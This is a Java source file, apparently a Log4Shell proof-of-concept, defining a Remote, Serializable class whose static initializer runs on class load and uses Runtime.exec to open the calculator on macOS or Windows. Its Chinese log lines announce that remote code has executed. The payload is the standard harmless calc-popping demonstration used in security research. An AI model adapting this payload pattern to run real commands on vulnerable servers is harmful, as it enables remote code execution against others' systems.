package com.fhdone.paper2019.util.log4jhack;

import java.io.Serializable;
import java.rmi.Remote;

public class CalcTest implements Remote, Serializable {
    static {
        try {
            System.err.println("远程代码开始执行了...");
            Runtime runtime = Runtime.getRuntime();
            String osName = System.getProperty("os.name");
            System.err.println(osName);
            if (osName.startsWith("Mac OS")) {
                String[] commands = {"open", "/System/Applications/Calculator.app"};
                runtime.exec(commands);
            } else if (osName.startsWith("Windows")) {
                // windows
                String[] commands = {"calc"};
                runtime.exec(commands);
            }
            System.err.println("远程代码被执行了...");
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("Hack_code执行了....");
    }
    public String show(){
        System.out.println(name+"远程调用执行");
        return "Result";
    }
    private String name;
    public CalcTest(String name){
        this.name=name;
    }
}
